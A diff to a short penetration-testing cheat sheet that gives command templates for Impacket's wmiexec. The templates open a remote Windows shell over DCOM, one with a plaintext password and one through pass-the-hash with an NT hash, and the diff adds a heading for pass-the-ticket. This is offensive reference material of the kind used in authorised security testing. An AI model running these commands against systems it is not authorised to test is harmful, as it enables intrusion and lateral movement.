@@ -2,7 +2,7 @@
 
 % windows, impacket-exec
 
-## wmiexec
+## wmiexec (creds)
 #plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
 Execute a command shell without touching the disk or running a new service using DCOM
 
@@ -10,11 +10,13 @@ Execute a command shell without touching the disk or running a new service using
 wmiexec.py '<domain>/<user>:<password>'@<ip>
 ```
 
-## pth 
+## pth (pth) 
 #plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
 
 Execute a command shell without touching the disk or running a new service using DCOM
 
 ```
-wmiexec.py -hashes <hash> <user>@<ip>
+wmiexec.py -hashes <nt_hash> <user>@<ip>
 ```
+
+## wmiexec (ptt)
